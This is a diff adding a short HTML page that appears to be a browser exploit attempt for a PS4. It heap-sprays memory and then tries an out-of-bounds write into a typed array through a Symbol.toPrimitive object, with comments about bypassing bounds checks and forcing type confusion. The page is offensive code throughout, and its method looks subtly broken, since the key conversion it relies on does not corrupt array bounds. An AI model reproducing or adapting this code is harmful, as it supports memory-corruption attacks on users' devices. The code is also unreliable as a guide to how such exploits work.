@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<script src="spray.js"></script>
+<script>
+// Target ArrayBuffer to overflow
+let targetBuf = new ArrayBuffer(0x1000);
+let targetView = new Uint32Array(targetBuf);
+
+// Craft malicious object to bypass bounds checks
+const evil = {
+  [Symbol.toPrimitive]() {
+    // Corrupt ArrayBuffer bounds (retail PS4 may allow this)
+    return 0xffffffff; // Force OOB write
+  }
+};
+
+// Trigger overflow
+function triggerOverflow() {
+  heapSpray(); // Fragment memory
+  try {
+    // Attempt OOB write (type confusion)
+    targetView[evil] = 0xcafebabe;
+    // Check if corruption succeeded
+    if (targetView.length > 0x1000 / 4) {
+      return true;
+    }
+  } catch (e) {
+    return false;
+  }
+}
+</script>
